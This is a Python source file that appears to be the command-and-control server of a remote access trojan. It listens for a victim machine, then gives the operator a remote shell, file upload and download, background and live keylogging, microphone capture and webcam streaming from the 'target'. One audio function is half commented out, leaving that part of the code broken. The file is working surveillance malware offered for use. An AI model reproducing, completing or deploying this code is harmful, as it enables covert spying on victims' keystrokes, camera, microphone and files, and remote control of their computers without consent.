# Import necessary libraries
import socket  # This library is used for creating socket connections.
import json  # JSON is used for encoding and decoding data in a structured format.
import os  # This library allows interaction with the operating system.
import pynput
import re
import pyaudio  # This library is used for audio input/output operations.
from pynput.keyboard import Key, Listener  # This library is used for capturing keyboard events.
import threading
import cv2
import pickle
import struct
import time


CONTROL_PORT = 5555
VIDEO_PORT = 9999
AUDIO_PORT = 9998

# Function to send data reliably as JSON-encoded strings
def reliable_send(data):
    # Convert the input data into a JSON-encoded string.
    jsondata = json.dumps(data)
    # Send the JSON-encoded data over the network connection after encoding it as bytes.
    target.send(jsondata.encode())

# Function to receive data reliably as JSON-decoded strings
def reliable_recv():
    data = ''
    while True:
        try:
            # Receive data from the target (up to 1024 bytes), decode it from bytes to a string,
            # and remove any trailing whitespace characters.
            data = data + target.recv(1024).decode().rstrip()
            # Parse the received data as a JSON-decoded object.
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the target machine
def upload_file(file_name):
    # Open the specified file in binary read ('rb') mode.
    f = open(file_name, 'rb')
    # Read the contents of the file and send them over the network connection to the target.
    target.send(f.read())

# Function to download a file from the target machine
def download_file(file_name,timeout):
    # Open the specified file in binary write ('wb') mode.
    f = open(file_name, 'wb')
    # Set a timeout for receiving data from the target (1 second).
    target.settimeout(timeout)
    chunk = target.recv(1024)
    while chunk:
        # Write the received data (chunk) to the local file.
        f.write(chunk)
        try:
            # Attempt to receive another chunk of data from the target.
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    # Reset the timeout to its default value (None).
    target.settimeout(None)
    # Close the local file after downloading is complete.
    f.close()


def keylogging_start():
    global keylogging_status, keylogging_filename

    if not keylogging_status:
        print('[+] Background key-logging session Started. (type "keylogging_stop" to end the session)')
        print(f"[i] This background key-logging session's log file will be record as \"{keylogging_filename}\"")
        keylogging_status = True
    else:
        print('[!] There is a background key-logging session running! type "keylogging_stop" to end the session')


def keylogging_stop():
    global keylogging_status, keylogging_filename

    if keylogging_status:
        print('[i] Stopping Keylogging...')
        download_file(keylogging_filename, 1)
        print(f'[+] Successfully download the previous keylogging session file as {keylogging_filename}')
        print('press ENTER to return to the CLI')

        keylogging_status = False
        keylogging_filename = None
    else:
        print('[!] There is no background key-logging running!')


def keylogging_live():
    global livekeylogging_status, keylogging_filename

    def check_stop_key(key):
        global livekeylogging_status, keylogging_filename

        if key == Key.esc:
            reliable_send('keylogging_live_stop')
            livekeylogging_status = False
            listener.stop()
            print("[+] Live keylogging stopped")

            if keylogging_filename != None:
                print("[i] Downloading the previous live keylogging sessions file...")
                try:
                    download_file(keylogging_filename,1)
                    print(f"[+] Successfully download the previous live key-logging session file as {keylogging_filename}")
                except:
                    print("[-] Fail to download the previous live keylogging sessions file")
                keylogging_filename = None

    listener = Listener(on_press=check_stop_key)
    listener.start()

    if keylogging_filename == None:
        print("[!] Due to no input filename or unvalid filename, this key-logging session's log file won't be downloaded at the end of the session.")
        print('[i] In case you desire to record the key-logging session next time, type "keylogging_live <filename>"')
    else:
        print(f'[i] This key-logging session log file will be downloaded as "{keylogging_filename}" inside your current directory')

    print("[+] Start listening to the target keys (Press ESC to end the session)")
    print("[i] Pressing key will be displayed in the terminal down below")

    while livekeylogging_status:
        keylog = reliable_recv()
        print(keylog) if keylog != 'end of keylogging' else None


# def liveaudio_start():
#     global liveaudio_status, audio_filename

#     p = pyaudio.PyAudio()
#     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     sock.bind(('0.0.0.0', 7777))

#     print(f"[i] This audio live-streaming session will be recorded as {audio_filename} at the end of the session")
#     print("[+] Start listening to the target's microphone... (Press ESC to end the session)")

    def check_stop_key(key):
        global liveaudio_status, audio_filename

        # Post live-audio sessions
        if key == Key.esc:                          
            reliable_send('liveaudio_stop')
            listener.stop()
            liveaudio_status = False
            print("[+] live audio stopped.")

            if audio_filename != None:
                print("[i] Downloading the previous audio live-streaming session's .wav file...")
                try:
                    download_file(audio_filename,5)
                    print(f"[+] Successfully download the previous audio live-streaming session file as {audio_filename}")
                except:
                    print("[-] Fail to download the previous audio live-streaming session file")

            audio_filename = None
            return
        
        else:
            pass

    listener = Listener(on_press=check_stop_key)
    listener.start()

    while liveaudio_status:
        data, _ = sock.recvfrom(1024 * 2)  # 2 bytes per sample (16-bit)
        stream.write(data)

# --- Global Flag to Stop Threads ---
stop_threads = False

# --- Stream Reception Functions ---
def video_reception_thread():
    global stop_threads
    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    video_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    video_server.bind(('0.0.0.0', VIDEO_PORT))
    video_server.listen(1)
    print("[*] Video server waiting for connection on port 9999...")
    
    try:
        conn, addr = video_server.accept()
        print(f"[+] Video client connected from: {addr}")
        
        data = b""
        payload_size = struct.calcsize("L")

        while not stop_threads:
            while len(data) < payload_size:
                packet = conn.recv(4096)
                if not packet: raise ConnectionError("Client disconnected")
                data += packet
            
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("L", packed_msg_size)[0]

            while len(data) < msg_size:
                data += conn.recv(4096)
            
            frame_data = data[:msg_size]
            data = data[msg_size:]
            
            frame = pickle.loads(frame_data)
            cv2.imshow('Live Video Stream', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                print("[!] 'q' pressed in video window. Type 'quit' in shell to exit.")
                # Don't stop threads here, let the main shell handle it
    except Exception as e:
        print(f"[!] Video stream ended: {e}")
    finally:
        print("[-] Video reception thread finished.")
        cv2.destroyAllWindows()
        video_server.close()

def audio_reception_thread():
    global stop_threads
    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    audio_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    audio_server.bind(('0.0.0.0', AUDIO_PORT))
    audio_server.listen(1)
    print("[*] Audio server waiting for connection on port 9998...")

    try:
        conn, addr = audio_server.accept()
        print(f"[+] Audio client connected from: {addr}")

        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
        
        while not stop_threads:
            data = conn.recv(1024)
            if not data: break
            stream.write(data)
    except Exception as e:
        print(f"[!] Audio stream ended: {e}")
    finally:
        print("[-] Audio reception thread finished.")
        audio_server.close()

# Function for the main communication loop with the target
def target_communication():
    global keylogging_filename, keylogging_status, liveaudio_status, audio_filename, livekeylogging_status

    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)

        if command == 'quit':
            break

        elif command == 'clear':
            os.system('clear')

        elif command[:3] == 'cd ':
            pass

        elif command[:8] == 'download':
            download_file(command[9:],1)

        elif command[:6] == 'upload':
            upload_file(command[7:])

        elif command[:16] == 'keylogging_start':
            filename = re.sub(r'[\\/:*?"<>|]', '', command[17:]).replace(' ', '')
            keylogging_filename = filename if (len(command) > 17 and filename != "") else 'keylog.txt'

            keylogging_start()

        elif command[:15] == 'keylogging_stop':
            keylogging_stop()

        elif command[:15] == 'liveaudio_start':
            if not liveaudio_status:
                filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')

                if len(command) > 16:
                    audio_filename = filename if (filename != "") else 'liveaudio.wav'       # audio_filename = filename if (len(command) > 16 and filename != "") else None

                liveaudio_status = True
                liveaudio_start()
            else:
                print('[!] Live audio is already running.')

        elif command[:15] == 'keylogging_live':
            if not livekeylogging_status:
                filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')

                if len(command) > 16:
                    keylogging_filename = filename if (filename != "") else 'keylog.txt'

                livekeylogging_status = True
                keylogging_live()
            else:
                print('[!] Live keylogging is already running.')

        elif command == 'stream_start':
            v_thread = threading.Thread(target=video_reception_thread, daemon=True)
            a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
            v_thread.start()
            a_thread.start()

        else:
            # For other commands, receive and print the result from the target.
            result = reliable_recv()
            print(result)


# Initialize live audio status as False
livekeylogging_status, liveaudio_status = False, False

# Initialize keylogging filename as None
audio_filename, keylogging_filename = None, None

# Initialize keylogging status as False
keylogging_status = False 

# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to any incoming request address ('0.0.0.0') to the port (5555).
sock.bind(('0.0.0.0', CONTROL_PORT))

# Start listening for incoming connections (maximum 5 concurrent connections).
print('[+] Listening For The Incoming Connections')
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address.
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Start the main communication loop with the target by calling target_communication.
target_communication()